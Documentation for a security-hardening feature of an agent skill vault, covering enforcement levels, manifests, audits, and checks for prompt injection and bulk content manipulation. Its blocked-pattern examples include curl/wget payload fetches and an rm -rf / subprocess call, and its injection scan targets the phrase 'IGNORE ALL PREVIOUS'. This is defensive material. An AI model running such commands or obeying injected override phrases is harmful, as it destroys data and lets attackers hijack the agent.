# Security Hardening

## Why Skill Hardening Matters

Agent skills (SKILL.md files and supporting code) run with the same
permissions as the agent itself. The Snyk ToxicSkills audit found that
13.4% of 3,984 marketplace skills had critical security flaws, with 76
confirmed malicious payloads and 91% containing prompt injection vectors.

Researchers have demonstrated that a modified skill can exfiltrate files,
deploy ransomware, or perform SQL injection with as few as three lines
in a configuration file.

Key attack vectors that hardening blocks:

- **Prompt injection via SKILL.md** that overrides vault rules
- **Shell preprocessing** using `!command` syntax to run arbitrary code
- **Tool escalation** via `allowed-tools` frontmatter granting unreviewed access
- **External data exfiltration** through embedded URLs to untrusted services
- **Supply chain attacks** via `curl`/`wget`/`pip`/`npm` in skill content

## Enforcement Levels

### Strict (default for new vaults)

Blocks all external URLs, shell preprocessing, and tool escalation.
Requires a manifest with SHA-256 hashes for every skill file. Requires
human review sign-off. Limits skills to 10 files and 500 KB total.

### Moderate

Same network and shell protections as strict. Requires manifests but
does not require human review. Allows up to 20 files and 2 MB total.
Suitable for teams with established skill development workflows.

### Permissive

Allows external URLs (except blocklisted domains). Still blocks shell
preprocessing and tool escalation. No manifest required. Up to 50 files
and 10 MB total. Use only in trusted, internal-only environments.

## Configuration

### skill-policy.json

Located at `.vault/schemas/skill-policy.json`. Created during `init.sh`
or manually. Set `"enabled": false` to disable all skill checks.

Key settings:

- `enforcement` — one of `strict`, `moderate`, `permissive`
- `url_allowlist` — domains permitted even in strict mode
- `url_blocklist` — domains blocked even in permissive mode
- `trusted_authors` — authors whose skills skip certain checks
- `skill_directories` — paths scanned for skills

### Adding Trusted Authors

Edit `trusted_authors` in `skill-policy.json`:

```json
"trusted_authors": ["platform-team@example.com", "security-lead"]
```

### Adding URL Allowlists

For skills that legitimately need specific external endpoints:

```json
"url_allowlist": ["api.your-company.com", "internal-docs.example.com"]
```

## Skill Manifests

When `require_manifest` is true, every skill directory must contain a
`skill-manifest.json` listing all files with their SHA-256 hashes.

The `skill-audit` command verifies hashes match, catches unauthorized
modifications, and flags unmanifested files. See
`.vault/schemas/skill-manifest.schema.md` for the full schema.

### Creating a Manifest

```bash
# Compute hashes for all skill files
find .claude/skills/my-skill -type f ! -name skill-manifest.json \
  -exec sha256sum {} \;
```

Then create `skill-manifest.json` with name, version, author, and the
files array. Run `vault-tools.sh skill-audit` to verify.

## Content Hardening (Optional)

Content hardening protects wiki and memory files from injection and
bulk manipulation. Disabled by default. Enable via `init.sh` or by
setting `"enabled": true` in `.vault/schemas/content-policy.json`.

### Checks Performed

- **Instruction injection** — scans for phrases like "IGNORE ALL PREVIOUS"
- **Bulk deletion** — flags commits deleting more than 20% of content
- **Confidence downgrades** — detects changes lowering confidence fields
- **Mass status changes** — flags many status field changes at once
- **File count limits** — warns on commits touching more than 25 files; can be overridden per-operation when justified (e.g., batch ingestion, broad cross-reference updates)

## Disabling Hardening

### Disable Skill Hardening

Set `"enabled": false` in `.vault/schemas/skill-policy.json`, or delete
the file entirely. The vault operates identically without it.

### Disable Content Hardening

Set `"enabled": false` in `.vault/schemas/content-policy.json`, or delete
the file. Content hardening is off by default.

### Skip During Init

During `init.sh`, choose `none` for skill hardening and `N` for content
hardening to start without any security checks.

## Blocked vs Allowed Patterns

### Blocked in Strict and Moderate

```markdown
<!-- BLOCKED: shell preprocessing -->
!command echo "hello"

<!-- BLOCKED: tool escalation -->
allowed-tools: Bash, Read, Write

<!-- BLOCKED: network commands -->
curl https://example.com/payload
wget https://example.com/script.sh

<!-- BLOCKED: code execution -->
eval "dangerous code"
subprocess.run(["rm", "-rf", "/"])
```

### Allowed at All Levels

```markdown
<!-- ALLOWED: normal skill instructions -->
When the user asks about vault queries, follow these steps...

<!-- ALLOWED: vault-internal references -->
Read [[wiki/index.md]] to find relevant pages.

<!-- ALLOWED: documentation links (if URL-allowed) -->
See the architecture guide in docs/architecture.md
```

## Running Audits

```bash
# Audit all skills against current policy
bash .vault/scripts/vault-tools.sh skill-audit

# Audit content integrity
bash .vault/scripts/vault-tools.sh content-audit

# Both run automatically in CI when policy files exist
```

## CI Integration

The `skill-audit` job in `.github/workflows/lint.yml` runs automatically
when `.vault/schemas/skill-policy.json` exists. It uses the same
`vault-tools.sh skill-audit` command available locally.
